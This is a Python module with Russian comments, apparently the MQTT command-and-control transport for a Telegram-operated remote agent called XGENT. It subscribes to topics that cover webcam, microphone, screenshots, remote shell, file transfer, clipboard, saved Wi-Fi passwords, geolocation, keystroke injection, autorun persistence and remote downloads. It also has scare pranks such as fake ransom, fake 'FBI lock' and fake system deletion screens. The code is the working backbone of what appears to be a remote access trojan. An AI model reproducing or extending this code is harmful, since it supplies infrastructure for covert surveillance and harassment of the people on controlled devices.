"""MQTT-транспорт для Telegram-бота XGENT.

Бот подписывается на топик статусов {prefix}/+/status и публикует команды
в {prefix}/<device_id>/cmd или {prefix}/all/cmd.
"""

import json
import logging
import threading
import time
import uuid
from typing import Any, Callable, Dict

import paho.mqtt.client as mqtt

from config import ENCRYPT_PAYLOAD, MQTT_BROKER, MQTT_PASSWORD, MQTT_PORT, MQTT_PREFIX, MQTT_TLS, MQTT_TRANSPORT, MQTT_USERNAME, MQTT_WS_PATH
from crypto import sign_message
from device_keys import enrolled_device_ids, key_for_device
from xgencrypto import encrypt_payload
from command_signing import verify_approved_command

log = logging.getLogger("xgent.transport")


class MQTTTransport:
    """Обёртка над paho-mqtt: подключение, подписка, публикация команд."""

    def __init__(
        self, on_message: Callable[[str, Dict[str, Any]], None], *,
        host: str = MQTT_BROKER, port: int = MQTT_PORT,
        username: str | None = MQTT_USERNAME, password: str | None = MQTT_PASSWORD,
        prefix: str = MQTT_PREFIX, client_id: str = "xgent-bot",
        tls: bool | None = None, transport: str = MQTT_TRANSPORT,
        ws_path: str = MQTT_WS_PATH,
    ):
        self.on_message = on_message
        self.host, self.port, self.username, self.password, self.prefix = host, port, username, password, prefix
        self.tls = MQTT_TLS if tls is None else tls
        if transport not in {"tcp", "websockets"}:
            raise ValueError("unsupported MQTT transport")
        self.transport = transport
        self.secondary: MQTTTransport | None = None
        self.connected = threading.Event()
        self._client = mqtt.Client(
            mqtt.CallbackAPIVersion.VERSION2,
            client_id=client_id,
            protocol=mqtt.MQTTv311,
            transport=self.transport,
        )
        if self.transport == "websockets":
            self._client.ws_set_options(path=ws_path)
        self._client.reconnect_delay_set(min_delay=2, max_delay=30)
        self._client.on_connect = self._on_connect
        self._client.on_disconnect = self._on_disconnect
        self._client.on_message = self._on_message
        if self.tls:
            self._client.tls_set()  # системные CA; без отключения проверки сертификата
        if self.username:
            log.info("MQTT auth: пользователь %s (TLS=%s)", self.username, self.tls)
            self._client.username_pw_set(self.username, self.password)

    def _on_connect(self, client, userdata, flags, reason_code, properties=None):
        if reason_code == 0:
            self.connected.set()
            # Медиа и мониторинг
            # Статусы и LWT должны доставляться надёжно.
            client.subscribe(f"{self.prefix}/+/status", qos=1)
            client.subscribe(f"{self.prefix}/+/update_progress", qos=1)
            client.subscribe(f"{self.prefix}/+/screenshot", qos=0)
            client.subscribe(f"{self.prefix}/+/webcam", qos=0)
            client.subscribe(f"{self.prefix}/+/sysinfo", qos=0)
            client.subscribe(f"{self.prefix}/+/mic", qos=0)
            client.subscribe(f"{self.prefix}/+/shell", qos=0)
            client.subscribe(f"{self.prefix}/+/shell_cancel", qos=0)
            client.subscribe(f"{self.prefix}/+/processes", qos=0)
            client.subscribe(f"{self.prefix}/+/clipboard", qos=0)
            client.subscribe(f"{self.prefix}/+/battery", qos=0)
            client.subscribe(f"{self.prefix}/+/network", qos=0)
            client.subscribe(f"{self.prefix}/+/services", qos=0)
            client.subscribe(f"{self.prefix}/+/capabilities", qos=0)
            client.subscribe(f"{self.prefix}/+/ack", qos=1)
            client.subscribe(f"{self.prefix}/+/disks", qos=0)
            # Файловые операции
            client.subscribe(f"{self.prefix}/+/file_get", qos=0)
            client.subscribe(f"{self.prefix}/+/file_put", qos=0)
            client.subscribe(f"{self.prefix}/+/file_del", qos=0)
            client.subscribe(f"{self.prefix}/+/dir_list", qos=0)
            client.subscribe(f"{self.prefix}/+/find_file", qos=0)
            client.subscribe(f"{self.prefix}/+/path_open", qos=0)
            # Сеть и система
            client.subscribe(f"{self.prefix}/+/ext_ip", qos=0)
            client.subscribe(f"{self.prefix}/+/wifi_info", qos=0)
            client.subscribe(f"{self.prefix}/+/usb_devices", qos=0)
            client.subscribe(f"{self.prefix}/+/netstat", qos=0)
            client.subscribe(f"{self.prefix}/+/startup_list", qos=0)
            client.subscribe(f"{self.prefix}/+/env_get", qos=0)
            client.subscribe(f"{self.prefix}/+/net_wifi_passwords", qos=0)
            client.subscribe(f"{self.prefix}/+/net_bluetooth_list", qos=0)
            client.subscribe(f"{self.prefix}/+/storage_smart", qos=0)
            client.subscribe(f"{self.prefix}/+/sys_installed_apps", qos=0)
            client.subscribe(f"{self.prefix}/+/sys_history_cmd", qos=0)
            # Управление вводом, дисплей, загрузка
            client.subscribe(f"{self.prefix}/+/hotkey", qos=0)
            client.subscribe(f"{self.prefix}/+/type_text", qos=0)
            client.subscribe(f"{self.prefix}/+/msgbox_spam", qos=0)
            client.subscribe(f"{self.prefix}/+/wallpaper_set", qos=0)
            client.subscribe(f"{self.prefix}/+/download_url", qos=0)
            client.subscribe(f"{self.prefix}/+/screen_off", qos=0)
            client.subscribe(f"{self.prefix}/+/screensaver_on", qos=0)
            client.subscribe(f"{self.prefix}/+/display_brightness", qos=0)
            client.subscribe(f"{self.prefix}/+/display_night_light", qos=0)
            client.subscribe(f"{self.prefix}/+/display_rotate", qos=0)
            client.subscribe(f"{self.prefix}/+/geo_location", qos=0)
            client.subscribe(f"{self.prefix}/+/volume_set", qos=0)
            client.subscribe(f"{self.prefix}/+/volume_toggle", qos=0)
            # Процессы
            client.subscribe(f"{self.prefix}/+/kill_process", qos=0)
            client.subscribe(f"{self.prefix}/+/proc_kill_name", qos=0)
            # Приколы
            client.subscribe(f"{self.prefix}/+/prank_screamer", qos=0)
            client.subscribe(f"{self.prefix}/+/prank_rickroll", qos=0)
            client.subscribe(f"{self.prefix}/+/prank_matrix", qos=0)
            client.subscribe(f"{self.prefix}/+/prank_siren", qos=0)
            client.subscribe(f"{self.prefix}/+/prank_shout_tts", qos=0)
            client.subscribe(f"{self.prefix}/+/prank_swap_mouse", qos=0)
            client.subscribe(f"{self.prefix}/+/prank_crazy_cursor", qos=0)
            client.subscribe(f"{self.prefix}/+/prank_hide_desktop", qos=0)
            client.subscribe(f"{self.prefix}/+/prank_dancing_windows", qos=0)
            client.subscribe(f"{self.prefix}/+/prank_random_site", qos=0)
            # Общий топик текстовых ответов и диагностики
            client.subscribe(f"{self.prefix}/+/output", qos=1)
            client.subscribe(f"{self.prefix}/+/standby_sleep", qos=0)
            client.subscribe(f"{self.prefix}/+/wake", qos=0)
            client.subscribe(f"{self.prefix}/+/autorun_status", qos=0)
            client.subscribe(f"{self.prefix}/+/autorun_enable", qos=0)
            client.subscribe(f"{self.prefix}/+/autorun_disable", qos=0)
            client.subscribe(f"{self.prefix}/+/power", qos=0)
            client.subscribe(f"{self.prefix}/+/agent_update", qos=1)
            client.subscribe(f"{self.prefix}/+/guardian", qos=1)
            client.subscribe(f"{self.prefix}/+/uninstall_agent", qos=0)
            client.subscribe(f"{self.prefix}/+/sys_uptime", qos=0)
            client.subscribe(f"{self.prefix}/+/sys_clean_temp", qos=0)
            client.subscribe(f"{self.prefix}/+/net_ping", qos=0)
            for _p in (
                "prank_bsod", "prank_fake_update", "prank_toast_spam", "prank_keyboard_disco",
                "prank_beep_morse", "prank_open_notepad_type", "prank_hacker_typer",
                "prank_sound_spooky", "prank_sound_fart", "prank_minimize_all",
                "prank_open_calc_spam", "prank_invert_screen", "prank_slow_mouse",
                "prank_random_clicks", "prank_paste_clipboard_spam", "prank_type_reversed",
                "prank_volume_jump", "prank_say_whisper", "prank_fake_virus", "prank_open_cd",
                "prank_change_wallpaper", "prank_restore_wallpaper", "prank_speak_time",
                "prank_rickroll_terminal", "prank_screen_off_brief", "prank_alert_loop",
                "prank_open_browser_memes", "prank_glitch_cursor", "prank_shake_window",
                "prank_meme_wallpaper", "prank_caps_disco", "prank_cursor_circle",
                "prank_fake_error_spam", "prank_fake_delete_sys32", "prank_ghost_typer",
                "prank_fbi_lock", "prank_cat_invaders", "prank_fake_ransom_cats",
                "prank_nyan_stream", "prank_random_beeps", "prank_confetti_winner",
                "prank_low_battery_fake", "prank_earthquake", "prank_laugh_track",
            ):
                client.subscribe(f"{self.prefix}/+/{_p}", qos=0)
            log.info("Подключено к %s:%s, топики успешно подписаны", self.host, self.port)
        else:
            log.warning("Не удалось подключиться к брокеру: %s", reason_code)

    def _on_disconnect(self, client, userdata, flags, reason_code, properties=None):
        self.connected.clear()
        log.warning("Отключено от брокера (код %s)", reason_code)

    def _on_message(self, client, userdata, message):
        try:
            data = json.loads(message.payload.decode("utf-8"))
        except (ValueError, UnicodeDecodeError):
            log.warning("Некорректный JSON в топике %s", message.topic)
            return
        try:
            self.on_message(message.topic, data)
        except Exception:
            log.exception("Ошибка обработки сообщения из %s", message.topic)

    def start(self) -> None:
        """Неблокирующий запуск: retry-loop при отсутствии интернета.

        Запускает отдельный поток, который пытается подключиться к брокеру
        раз в 5 секунд (до 12 попыток = 1 минута), после чего paho сам
        управляет переподключением через loop_start().
        """
        self._client.loop_start()
        threading.Thread(target=self._connect_with_retry, daemon=True, name="mqtt-connector").start()
        if self.secondary is not None:
            self.secondary.start()

    def _connect_with_retry(self, max_attempts: int = 0, delay: float = 5.0) -> None:
        """Попытки подключения с паузой. max_attempts=0 — бесконечно."""
        attempt = 0
        while True:
            attempt += 1
            try:
                log.info("[MQTT] Попытка подключения #%d к %s:%d...", attempt, self.host, self.port)
                self._client.connect(self.host, self.port, keepalive=60)
                log.info("[MQTT] Подключение инициировано, ждём on_connect.")
                return  # paho loop_start() возьмёт на себя дальнейшее
            except Exception as exc:
                log.warning("[MQTT] Попытка #%d неудачна: %s", attempt, exc)
                if max_attempts and attempt >= max_attempts:
                    log.error("[MQTT] Все %d попыток исчерпаны — работаем без брокера.", max_attempts)
                    return
                log.info("[MQTT] Повтор через %.0f сек...", delay)
                time.sleep(delay)

    def stop(self) -> None:
        if self.secondary is not None:
            self.secondary.stop()
        self._client.loop_stop()
        self._client.disconnect()

    def publish_command(self, device_id: str, cmd_type: str, **kwargs: Any) -> bool | None:
        """Отправить команду устройству или всем устройствам (device_id='all').

        Каждая команда получает короткий id (correlation) и публикуется с QoS 1,
        True означает accepted, не доставку. False — доказанный отказ до
        enqueue (валидация, disconnected precheck, очередь переполнена).
        None — неопределённый результат после Paho publish: при QoS1 даже
        MQTT_ERR_NO_CONN может оставить пакет для отправки после reconnect.
        Исключения после начала publish тоже не доказывают отсутствие пакета.
        """
        if self.secondary is not None:
            try:
                enrolled = enrolled_device_ids()
            except ValueError:
                log.warning("Команда %s не отправлена: каталог ключей недоступен", cmd_type)
                return False
            if device_id in enrolled:
                return self.secondary.publish_command(device_id, cmd_type, **kwargs)
            if device_id == "all":
                results = [self.secondary.publish_command(each, cmd_type, **kwargs) for each in enrolled]
                legacy = self._publish_command_local(device_id, cmd_type, **kwargs)
                outcomes = [legacy, *results]
                if all(result is True for result in outcomes):
                    return True
                # Some targets may already have accepted the command. Do not
                # report a definite refusal after a partial or ambiguous send.
                if any(result is True or result is None for result in outcomes):
                    return None
                return False
        return self._publish_command_local(device_id, cmd_type, **kwargs)

    def _publish_command_local(self, device_id: str, cmd_type: str, **kwargs: Any) -> bool | None:
        if "type" in kwargs and kwargs["type"] != cmd_type:
            log.warning("Command publish refused: payload type override")
            return False
        cmd_id = kwargs.pop("id", uuid.uuid4().hex[:8])
        # Reserved routing fields win over caller kwargs. Validate the actual
        # serialized type so a non-shell entry cannot smuggle a shell payload.
        payload = {**kwargs, "type": cmd_type, "id": cmd_id}
        if payload["type"] == "shell" and verify_approved_command(
            payload.get("approval"), command=payload.get("command"),
            expected_device_id=device_id, now=int(time.time()),
        ) is None:
            log.warning("Shell publish refused: approval is missing or invalid")
            return False
        if not self.connected.is_set():
            log.warning("Команда %s не отправлена: нет соединения с брокером", cmd_type)
            return False
        topic = f"{self.prefix}/all/cmd" if device_id == "all" else f"{self.prefix}/{device_id}/cmd"
        try:
            message_key = None if device_id == "all" else key_for_device(device_id)
        except (OSError, ValueError):
            log.warning("Команда %s не отправлена: ключ устройства недоступен", cmd_type)
            return False
        if ENCRYPT_PAYLOAD:
            body = encrypt_payload(payload, key=message_key)
        else:
            body = payload
        message = sign_message(body, key=message_key)
        info = self._client.publish(topic, json.dumps(message, ensure_ascii=False), qos=1)
        if info.rc == mqtt.MQTT_ERR_QUEUE_SIZE:
            log.warning("Команда %s не поставлена в очередь %s (rc=%s)", cmd_type, topic, info.rc)
            return False
        if info.rc != mqtt.MQTT_ERR_SUCCESS:
            log.warning("Команда %s не ушла в %s (rc=%s)", cmd_type, topic, info.rc)
            return None
        log.info("Команда %s (id=%s) -> %s", cmd_type, cmd_id, topic)
        return True
